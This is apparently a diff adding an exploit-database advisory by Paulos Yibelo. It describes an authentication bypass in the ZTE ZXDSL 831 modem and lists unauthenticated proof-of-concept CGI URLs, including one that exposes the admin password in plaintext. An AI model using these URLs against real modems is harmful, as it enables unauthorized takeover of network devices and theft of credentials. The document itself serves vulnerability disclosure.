@@ -1,0 +1,31 @@
+# Exploit Title: ZTE ZXDSL 831 Insecure Direct Object Reference
+# Date: 11/3/2014
+# Exploit Author: Paulos Yibelo
+# Vendor Homepage: zte.com.cn
+# Software Link: -
+# Version: -
+# Tested on: Windows 7
+# CVE :-
+
+ZTE ZXDSL 831CII suffers from an insecure direct object reference
+vulnerability that allows for authentication bypass.
+
+The modem usually serves html files & protects them with HTTP Basic
+authentication. however, the cgi files, does not get this protection.
+so simply requesting any cgi file (without no authentication) would
+give a remote attacker full access to the modem and then can easily be
+used to root the modem and disrupt network activities.
+
+So requesting modem.ip.address would result HTTP Authentication
+request, but simply requesting http://192.168.1.1/main.cgi will bypass
+it.
+
+PoC: http://192.168.1.1/adminpasswd.cgi (will result admin password
+change page) - viewing the source will show the current password
+(unencrypted)
+http://192.168.1.1/userpasswd.cgi
+http://192.168.1.1/upload.cgi
+http://192.168.1.1/conprocess.cgi
+http://192.168.1.1/connect.cgi
+.
+.
